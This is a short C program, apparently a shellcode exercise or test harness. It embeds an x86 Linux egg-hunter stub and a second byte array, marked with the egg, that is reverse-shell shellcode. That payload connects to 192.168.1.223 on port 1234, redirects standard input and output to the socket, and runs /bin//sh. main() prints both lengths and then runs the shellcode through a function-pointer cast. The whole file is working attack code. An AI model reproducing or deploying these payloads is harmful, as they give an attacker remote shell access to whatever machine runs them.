#include<stdio.h>
#include<string.h>


unsigned char hunter[] = "\x31\xdb\xf7\xe3\x31\xc9\xb9\x90\x50\x90\x50\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\xb0\x0c\xcd\x80\x3c\xf2\x74\xef\x89\xd7\x39\x0f\x75\xee\x39\x0f\x75\xea\xff\xe1";
                        
/*                      ________________________________    */
/*                     |      EGG       |      EGG      |   */
unsigned char code[] = "\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb1\x01\xb3\x02\x66\xb8\x67\x01\xcd\x80\x89\xc7\xb2\x16\x31\xc9\x51\xb9\xc1\xa9\x02\xe0\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\x89\xfb\x66\xb8\x6a\x01\xcd\x80\x31\xdb\x31\xc9\xb1\x03\x31\xc0\x89\xfb\xb0\x3f\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void main()
{
	printf("Egg hunter length: %d\n", strlen(hunter));
        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
